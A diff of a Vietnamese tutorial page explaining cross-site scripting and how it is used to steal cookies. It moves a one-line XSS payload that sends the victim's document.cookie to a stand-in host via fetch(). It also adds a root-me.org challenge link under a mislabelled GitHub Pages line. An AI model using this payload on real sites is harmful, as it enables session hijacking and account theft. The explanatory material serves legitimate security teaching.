@@ -5,10 +5,10 @@
 
 **1. Cross-site scripting XSS là gì?**
 > Cross-site scripting (a.k.a XSS) là một lỗ hổng bảo mật web phổ biến và dễ bị tấn công nhất cho phép kẻ tấn công thực thi script trên Client.
-`<script>fetch(`http://example.com/hacked.php?xss=${document.cookie}`)</script>`
 Thông thường, các cuộc tấn công XSS được sử dụng để vượt qua truy cập và mạo danh người dùng.
 
 Mục đích chính của cuộc tấn công này là ăn cắp dữ liệu nhận dạng của người dùng như:
+```<script>fetch(`http://example.com/hacked.php?xss=${document.cookie}`)</script>```
 
 cookies
 session
@@ -17,6 +17,9 @@ các thông tin khác....
 Trong hầu hết các trường hợp, cuộc tấn công này đang được sử dụng để ăn cắp cookie của người khác.
 
 Như chúng ta biết, cookie giúp ta đăng nhập tự động.
+(https://www.root-me.org/en/Challenges/Web-Client/)
+This site was built using [GitHub Pages](https://www.root-me.org/en/Challenges/Web-Client).
+
 
 Do đó khi cookie bị đánh cắp, ta có thể đăng nhập bằng các thông tin nhận dạng khác.
 
